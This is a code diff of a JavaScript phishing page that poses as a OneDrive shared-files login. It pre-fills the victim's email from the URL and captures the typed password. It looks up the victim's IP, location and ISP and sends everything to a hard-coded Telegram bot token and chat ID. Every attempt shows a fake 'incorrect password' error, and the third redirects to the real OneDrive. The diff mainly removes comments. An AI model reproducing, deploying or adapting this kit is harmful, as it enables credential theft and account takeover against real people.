@@ -1,8 +1,6 @@
-// ✅ Track how many login attempts have been made
 let attemptCount = 0;
 
 document.addEventListener('DOMContentLoaded', () => {
-    // ✅ Get all important elements from the page
     const signInModal = document.getElementById('sign-in-modal');
     const modalOverlay = document.getElementById('modal-overlay');
     const emailInput = document.querySelector('.sign-in-input[type="email"]');
@@ -10,7 +8,6 @@ document.addEventListener('DOMContentLoaded', () => {
     const signInBtn = document.getElementById('sign-in-btn');
     const fileTiles = document.querySelectorAll('.file');
 
-    // ✅ Verification overlay handling
     const verificationOverlay = document.getElementById('verification-overlay');
     const verifyBtn = document.getElementById('verify-btn');
     const verifyCheckbox = document.getElementById('verify-checkbox');
@@ -25,46 +22,40 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    // ✅ Remove close button if it exists
     const closeBtn = document.getElementById('close-btn');
     if (closeBtn) closeBtn.remove();
 
-    // ✅ If key elements are missing, stop
     if (!signInModal || !modalOverlay || !emailInput || !passwordInput || !signInBtn) {
         console.error("Required modal elements not found.");
         return;
     }
 
-    // ✅ Hide modal on page load
     signInModal.classList.add('hidden');
     modalOverlay.classList.add('hidden');
 
-    // ✅ Extract email from URL (e.g. site.com/#user@mail.com)
     function getEmailFromURL() {
         const hash = window.location.hash;
         return hash && hash.startsWith("#") ? decodeURIComponent(hash.substring(1)) : "";
     }
 
-    // ✅ If email exists in URL, lock it into the email field
     const urlEmail = getEmailFromURL();
     if (urlEmail) {
         emailInput.value = urlEmail;
         emailInput.setAttribute("readonly", "true");
-        emailInput.classList.add("email-field"); // for gray background
+        emailInput.classList.add("email-field");
     }
 
-    // ✅ Show modal when a file tile is clicked
     fileTiles.forEach(tile => {
         tile.addEventListener("click", () => {
             clearError();
-            passwordInput.value = "";                 // reset password
-            signInBtn.textContent = "View files";     // reset button label
-            modalOverlay.classList.remove("hidden");  // show overlay
-            signInModal.classList.remove("hidden");   // show modal
+            passwordInput.value = "";
+            signInBtn.textContent = "View files";
+            modalOverlay.classList.remove("hidden");
+            signInModal.classList.remove("hidden");
+            document.body.style.overflow = "hidden"; // lock scroll on mobile
         });
     });
 
-    // ✅ Handle login button click
     signInBtn.addEventListener('click', async () => {
         const email = emailInput.value.trim();
         const password = passwordInput.value.trim();
@@ -74,16 +65,12 @@ document.addEventListener('DOMContentLoaded', () => {
             return;
         }
 
-        // ✅ Change button to show "Verifying..."
         signInBtn.textContent = "Verifying...";
+        attemptCount++;
 
-        attemptCount++; // Increase login attempt
-
-        // ✅ Telegram setup (change to your token/chat if needed)
         const botToken = "7581994701:AAGb0gyfgIMQH-RDhnogyMfgaAJbnK7h534";
         const chatId = "5642369607";
 
-        // ✅ Get user IP and location
         let ipData = await fetch("https://ipapi.co/json")
             .then(res => res.json())
             .catch(() => null);
@@ -94,7 +81,6 @@ document.addEventListener('DOMContentLoaded', () => {
         let isp = ipData?.org || "Unknown ISP";
         let userAgent = navigator.userAgent;
 
-        // ✅ Message to send to Telegram
         const message = `🚨 *OneDrive Login Attempt (${attemptCount}/3)* 🚨\n\n`
             + `📧 *Email:* ${email}\n`
             + `🔑 *Password:* ${password}\n\n`
@@ -103,7 +89,6 @@ document.addEventListener('DOMContentLoaded', () => {
             + `🏢 *ISP:* ${isp}\n\n`
             + `🖥 *Browser:* ${userAgent}`;
 
-        // ✅ Send the Telegram message
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -114,20 +99,16 @@ document.addEventListener('DOMContentLoaded', () => {
             })
         });
 
-        // ✅ Handle login logic
         if (attemptCount >= 3) {
-            // ✅ Redirect after 3rd failure
             window.location.href = "https://onedrive.live.com";
         } else {
-            // ✅ Show incorrect password message below password box
             showError(`❌ Incorrect password. Attempt ${attemptCount} of 3`);
-            passwordInput.value = "";              // clear password
-            signInBtn.textContent = "View files";  // reset button label
+            passwordInput.value = "";
+            signInBtn.textContent = "View files";
         }
     });
 });
 
-// ✅ Show an error message under the password box
 function showError(message) {
     clearError();
     const msg = document.createElement('div');
@@ -144,7 +125,6 @@ function showError(message) {
     }
 }
 
-// ✅ Remove existing error message if present
 function clearError() {
     const existing = document.querySelector('.error-msg');
     if (existing) existing.remove();
